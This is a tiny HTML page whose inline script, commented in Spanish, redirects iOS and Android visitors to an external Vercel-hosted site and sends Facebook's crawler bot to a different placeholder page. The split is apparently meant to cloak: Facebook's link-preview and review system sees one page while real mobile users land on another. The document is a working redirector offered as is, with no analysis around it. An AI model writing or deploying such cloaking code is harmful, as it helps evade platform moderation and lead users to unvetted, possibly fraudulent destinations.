<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Metatags y otros elementos del encabezado -->
</head>
<body>
    <!-- Verificar el User-Agent para redirigir a https://paneldirecto.vercel.app solo en dispositivos iOS y Android -->
    <script>
        var userAgent = navigator.userAgent;

        if (userAgent.match(/iOS|Android/i)) {
            window.location.href = "https://paneldirecto.vercel.app"; // Redirige a la página deseada
        } else if (userAgent.includes("FacebookBot") || userAgent.includes("facebookexternalhit")) {
            // Redirige inmediatamente a otra página si es un bot de Facebook
            window.location.href = "https://otra-pagina.com"; 
        }
    </script>
</body>
</html>
